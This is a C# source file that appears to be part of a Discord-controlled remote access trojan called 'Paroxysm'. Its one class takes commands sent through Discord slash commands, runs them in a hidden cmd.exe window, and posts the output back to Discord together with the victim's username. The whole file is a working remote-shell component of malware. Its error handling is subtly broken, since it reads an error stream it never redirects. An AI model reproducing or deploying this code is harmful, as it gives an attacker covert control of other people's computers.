using System.Diagnostics;
using Discord;
using Discord.WebSocket;
using Paroxysm.Discord;

namespace Paroxysm.Hooks.Actions;

public static class ExecuteCommandAction
{
    public static Embed Follow(IEnumerable<SocketSlashCommandDataOption>? options)
    {
        if (options == null || options.Count() == 0)
        {
            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                "Cannot add application to startup.", Environment.UserName, null);
        }

        var command = options.ElementAt(0).Value;
        var arguments = options.Skip(1).ToList().Select(arg => arg.Value);
        string cmdArgs = string.Empty;
        foreach (var argument in arguments)
        {
            cmdArgs += argument.ToString() + " ";
        }

        try
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };
            process.Start();

            // Add command and arguments to it
            process.StandardInput.WriteLine($"{command} {cmdArgs}");

            var output = process.StandardOutput.ReadToEnd();
            var error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            if (output.Length == 0 || error is not null)
            {
                Console.WriteLine(error.ToString());
                return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                    "Command does not return result or not exist.", Environment.UserName, null);
            }

            return DiscordEmbed.CreateWithText(Color.Red, $"Command {command} result:",
                output, Environment.UserName, null);
        }
        catch (Exception exception)
        {
            Console.WriteLine(exception.ToString());
            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                exception.ToString(), Environment.UserName, null);
        }
    }
}